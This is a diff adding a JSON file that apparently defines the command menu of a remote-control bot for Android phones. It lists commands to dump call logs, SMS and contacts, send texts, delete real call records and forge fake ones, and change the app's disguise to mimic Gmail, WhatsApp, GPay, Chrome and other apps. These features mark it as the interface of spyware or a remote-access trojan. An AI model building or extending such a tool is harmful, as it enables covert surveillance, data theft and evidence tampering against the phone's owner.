@@ -1,0 +1,22 @@
+{"android":[
+    [{"text":"checkPermissions"},{"text":"dumpCallLogs"}],
+    [{"text":"isWifiConnected"},{"text":"batteryLevel"}],
+    [{"text":"iScreenOn"},{"text":"isCharging"}],
+    [{"text":"allApps"},{"text":"details"}],
+    [{"text":"hfStatus"},{"text":"btStatus"}],
+    [{"text":"incMVolume"},{"text":"decMVolume"}],
+    [{"text":"incRVolume"},{"text":"decRVolume"}],
+    [{"text":"flashOn"},{"text":"flashOff"}],
+    [{"text":"isGpsEnabled"},{"text":"playSound"}],
+    [{"text":"chgPLAY"},{"text":"chgCHROME"}],
+    [{"text":"chgUPDATE"},{"text":"chgFACEBOOK"}],
+    [{"text":"chgGMAIL"},{"text":"dumpCallLogs"}],
+    [{"text":"chgGPAY"},{"text":"chgGOOGLE"}],
+    [{"text":"chgINSTAGRAM"},{"text":"chgMAPS"}],
+    [{"text":"chgPHOTO"},{"text":"chgWHATSAPP"}],
+    [{"text":"chgYOUTUBE"},{"text":"chgDEFAULT"}],
+    [{"text":"dumpSms|number"},{"text":"dumpContacts|letter"}],
+    [{"text":"sendSms|number|message"},{"text":"createContact|number|name"}],
+    [{"text":"dltCallLog|number"},{"text":"fakeCallLog|num|type|time|sec"}],
+    [{"text":"vibrate|sec"},{"text":"play|url"}]
+]}
